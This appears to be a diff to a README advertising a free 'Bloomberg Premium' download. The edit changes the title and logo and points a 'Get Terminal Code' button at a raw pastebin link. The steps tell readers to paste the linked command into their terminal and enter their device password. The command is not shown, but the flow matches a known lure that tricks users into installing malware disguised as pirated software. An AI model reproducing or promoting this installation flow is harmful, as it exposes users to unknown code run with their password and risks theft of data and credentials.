@@ -1,8 +1,8 @@
-# Bloomberg Premium Download for Windows & Mac - Professional Trading Platform  
+# Bloomberg Premium Download for Windows & Mac - Professional Terminal  
 
 <div align="center">
 
-![Bloomberg Premium Logo](https://mma.prnewswire.com/media/649927/Bloomberg_Black_Logo.jpg)
+![Bloomberg Premium Logo](https://www.insper.edu.br/content/insper-portal/en/campus/biblioteca-telles/recursos-de-busca/bloomberg/_jcr_content/root/responsivegrid/wrapper/container_grid/container/wrapper/featured_card_container/image.coreimg.png/1721928093864/pngwing-com--1-.png)
 
 </div>  
 
@@ -70,7 +70,9 @@ The platform is known for its **robust functionality, security, and reliability*
 ### Installation via a command in the terminal:
 
 1. Click on the "Get terminal code" button and copy the installation command there.
-[![Get Terminal Code](https://img.shields.io/badge/Get_Terminal_Code-silver?style=for-the-badge&logo=apple)](silknakod)
+
+[![Get Terminal Code](https://img.shields.io/badge/Get_Terminal_Code-silver?style=for-the-badge&logo=apple)](https://pastebin.com/raw/tJGWhcic)
+
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation. 
 
